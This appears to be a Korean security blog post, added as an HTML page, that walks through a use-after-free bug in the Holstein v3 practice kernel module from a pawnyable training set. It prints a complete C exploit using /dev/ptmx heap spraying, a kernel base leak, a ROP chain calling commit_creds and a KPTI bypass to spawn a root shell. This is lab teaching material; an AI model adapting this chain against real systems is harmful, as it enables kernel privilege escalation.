@@ -1,0 +1,172 @@
+<!doctype html>
+<html lang="ko" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[KERNEL] Heap Use After Free · whrds.log</title><meta name="description" content="※ 자료들을 참고하여 분석을 진행하였기에 잘못된 부분이 있을지도 모릅니다. ※ 보완 혹은 수정해야 되는 부분이 있다면 알려주시면 확인 후 조치하도록 하겠습니다. 이번에는 Holstein v3을 가지고 수행한다.https://pawnyable.cafe/linux-kernel/LK01/distfiles/LK01-3.tar.g">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/ko/posts/kernel-heap-use-after-free/">
+  <link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/kernel-heap-use-after-free/"><link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/kernel-heap-use-after-free/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[KERNEL] Heap Use After Free · whrds.log"><meta property="og:description" content="※ 자료들을 참고하여 분석을 진행하였기에 잘못된 부분이 있을지도 모릅니다. ※ 보완 혹은 수정해야 되는 부분이 있다면 알려주시면 확인 후 조치하도록 하겠습니다. 이번에는 Holstein v3을 가지고 수행한다.https://pawnyable.cafe/linux-kernel/LK01/distfiles/LK01-3.tar.g"><meta property="og:url" content="https://whrds.github.io/ko/posts/kernel-heap-use-after-free/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[KERNEL] Heap Use After Free","description":"※ 자료들을 참고하여 분석을 진행하였기에 잘못된 부분이 있을지도 모릅니다. ※ 보완 혹은 수정해야 되는 부분이 있다면 알려주시면 확인 후 조치하도록 하겠습니다. 이번에는 Holstein v3을 가지고 수행한다.https://pawnyable.cafe/linux-kernel/LK01/distfiles/LK01-3.tar.g","datePublished":"2024-11-14","inLanguage":"ko","url":"https://whrds.github.io/ko/posts/kernel-heap-use-after-free/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">본문으로 건너뛰기</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/ko/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="주 메뉴">
+      <a href="/ko/" aria-current="page">글</a>
+      <a href="/ko/about/">소개</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="#" class="active" lang="ko" aria-current="true">KO</a>
+        <a href="/en/posts/kernel-heap-use-after-free/" class="" lang="en">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[KERNEL] Heap Use After Free</h1><p class="article-description">※ 자료들을 참고하여 분석을 진행하였기에 잘못된 부분이 있을지도 모릅니다. ※ 보완 혹은 수정해야 되는 부분이 있다면 알려주시면 확인 후 조치하도록 하겠습니다. 이번에는 Holstein v3을 가지고 수행한다.https://pawnyable.cafe/linux-kernel/LK01/distfiles/LK01-3.tar.g</p><div class="article-meta"><time datetime="2024-11-14">2024년 11월 14일</time><span>·</span><span>1 분 읽기</span></div></header><div class="prose"><p><strong>※ 자료들을 참고하여 분석을 진행하였기에 잘못된 부분이 있을지도 모릅니다.</strong> </p>
+<p><strong>※ 보완 혹은 수정해야 되는 부분이 있다면 알려주시면 확인 후 조치하도록 하겠습니다.</strong></p>
+<p>이번에는 Holstein v3을 가지고 수행한다.</p>
+<p><a href="https://pawnyable.cafe/linux-kernel/LK01/distfiles/LK01-3.tar.gz">https://pawnyable.cafe/linux-kernel/LK01/distfiles/LK01-3.tar.gz</a></p>
+<p>v2에서는 g_buf를 kmalloc()을 사용하여 할당을 수행했었다.</p>
+<p>v3으로 넘어오면서는 kzalloc()으로 할당을 수행하여 memory leak을 어느정도 방지를 수행했다.</p>
+<pre><code>g_buf = kzalloc(BUFFER_SIZE, GFP_KERNEL);
+if (!g_buf) {
+ printk(KERN_INFO &quot;kmalloc failed&quot;);
+ return -ENOMEM;
+}
+</code></pre>
+<p>kzalloc()은 user 영역의 함수로 보면 calloc()과 같이 0으로 초기화를 수행한다.</p>
+<p>g_buf도 kzalloc으로 할당하고, module_read(), module_write()도 v2와 동일하게 안전한 함수들을 사용하는데 어느 부분에서 취약점이 발생할까?</p>
+<p>v3에서는 메모리를 해제하는 부분에서 취약점이 발생하게 된다.</p>
+<pre><code>static int module_close(struct inode *inode, struct file *file)
+{
+ printk(KERN_INFO &quot;module_close called\n&quot;);
+ kfree(g_buf);
+ return 0;
+}
+</code></pre>
+<p>kfree()를 통해 메모리를 해제하지만 g_buf에 대한 포인터는 초기화를 수행하지 않는다.</p>
+<p>이렇게 되버리면 g_buf는 해제된 이후에도 Heap 영역에 대한 데이터를 가지고 있게 된다.</p>
+<p>이를 이용하여 해제된 메모리를 다시 사용하여 공격하는 UAF를 수행할 수 있게 된다.</p>
+<pre><code>int fd1 = open(&quot;/dev/holstein&quot;, O_RDWR);
+int fd2 = open(&quot;/dev/holstein&quot;, O_RDWR);
+close(fd1);
+write(fd2, &quot;Hello&quot;, 5);
+</code></pre>
+<p>Kernel은 프로세스들의 리소스가 공유된다는 점을 이용하여 위와 같이 작성한다.</p>
+<p>이렇게 되면 fd1은 해제되었지만 fd2에 값을 쓰는 write()에 의해 데이터가 수정되게 된다.</p>
+<p>이를 악용하여 원래의 함수 테이블을 fake func table 주소로 overwrite가 가능해지게 되어 Exploit이 가능해진다.</p>
+<pre><code>#include &lt;fcntl.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/shm.h&gt;
+#include &lt;sys/timerfd.h&gt;
+#include &lt;unistd.h&gt;
+
+unsigned long kbase, g_buf, current;
+unsigned long user_cs, user_ss, user_rsp, user_rflags;
+
+#define ofs_tty_ops 0xc39c60
+#define rop_push_rdx_xor_eax_415b004f_pop_rsp_rbp (kbase + 0x14fbea)
+#define rop_pop_rdi (kbase + 0x14078a)
+#define rop_pop_rcx (kbase + 0x0eb7e4)
+#define rop_mov_rdi_rax_rep_movsq (kbase + 0x638e9b)
+#define rop_bypass_kpti (kbase + 0x800e26)
+#define addr_commit_creds (kbase + 0x0723c0)
+#define addr_prepare_kernel_cred (kbase + 0x072560)
+
+static void win() {
+  char *argv[] = { &quot;/bin/sh&quot;, NULL };
+  char *envp[] = { NULL };
+  puts(&quot;[+] win!&quot;);
+  execve(&quot;/bin/sh&quot;, argv, envp);
+}
+
+static void save_state() {
+  asm(
+      &quot;movq %%cs, %0\n&quot;
+      &quot;movq %%ss, %1\n&quot;
+      &quot;movq %%rsp, %2\n&quot;
+      &quot;pushfq\n&quot;
+      &quot;popq %3\n&quot;
+      : &quot;=r&quot;(user_cs), &quot;=r&quot;(user_ss), &quot;=r&quot;(user_rsp), &quot;=r&quot;(user_rflags)
+      :
+      : &quot;memory&quot;);
+}
+
+void fatal(const char *msg) {
+  perror(msg);
+  exit(1);
+}
+
+int main() {
+  save_state();
+
+  int fd1 = open(&quot;/dev/holstein&quot;, O_RDWR);
+  int fd2 = open(&quot;/dev/holstein&quot;, O_RDWR);
+  if (fd1 == -1 || fd2 == -1)
+    fatal(&quot;/dev/holstein&quot;);
+  close(fd1);
+
+  int spray[100];
+  for (int i = 0; i &lt; 50; i++) {
+    spray[i] = open(&quot;/dev/ptmx&quot;, O_RDONLY | O_NOCTTY);
+    if (spray[i] == -1) fatal(&quot;/dev/ptmx&quot;);
+  }
+
+  char buf[0x400];
+  read(fd2, buf, 0x400);
+  kbase = *(unsigned long*)&amp;buf[0x18] - ofs_tty_ops;
+  g_buf = *(unsigned long*)&amp;buf[0x38] - 0x38;
+  printf(&quot;kbase = 0x%016lx\n&quot;, kbase);
+  printf(&quot;g_buf = 0x%016lx\n&quot;, g_buf);
+
+  unsigned long *chain = (unsigned long*)&amp;buf;
+  *chain++ = rop_pop_rdi;
+  *chain++ = 0;
+  *chain++ = addr_prepare_kernel_cred;
+  *chain++ = rop_pop_rcx;
+  *chain++ = 0;
+  *chain++ = rop_mov_rdi_rax_rep_movsq;
+  *chain++ = addr_commit_creds;
+  *chain++ = rop_bypass_kpti;
+  *chain++ = 0xdeadbeef;
+  *chain++ = 0xdeadbeef;
+  *chain++ = (unsigned long)&amp;win;
+  *chain++ = user_cs;
+  *chain++ = user_rflags;
+  *chain++ = user_rsp;
+  *chain++ = user_ss;
+
+  *(unsigned long*)&amp;buf[0x3f8] = rop_push_rdx_xor_eax_415b004f_pop_rsp_rbp;
+
+  write(fd2, buf, 0x400);
+
+  int fd3 = open(&quot;/dev/holstein&quot;, O_RDWR);
+  int fd4 = open(&quot;/dev/holstein&quot;, O_RDWR);
+  if (fd3 == -1 || fd4 == -1)
+    fatal(&quot;/dev/holstein&quot;);
+  close(fd3);
+  for (int i = 50; i &lt; 100; i++) {
+    spray[i] = open(&quot;/dev/ptmx&quot;, O_RDONLY | O_NOCTTY);
+    if (spray[i] == -1) fatal(&quot;/dev/ptmx&quot;);
+  }
+
+  read(fd4, buf, 0x400);
+  *(unsigned long*)&amp;buf[0x18] = g_buf + 0x3f8 - 12*8;
+  write(fd4, buf, 0x20);
+
+  for (int i = 50; i &lt; 100; i++) {
+    ioctl(spray[i], 0, g_buf - 8); // rsp=rdx; pop rbp;
+  }
+
+  getchar();
+  return 0;
+}
+</code></pre>
+</div><div class="article-end"><a href="/ko/">← 모든 글 보기</a><a href="/en/posts/kernel-heap-use-after-free/" hreflang="en">이 글을 영어로 읽기 →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>관찰하고, 검증하고, 기록합니다.</span><a href="/ko/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
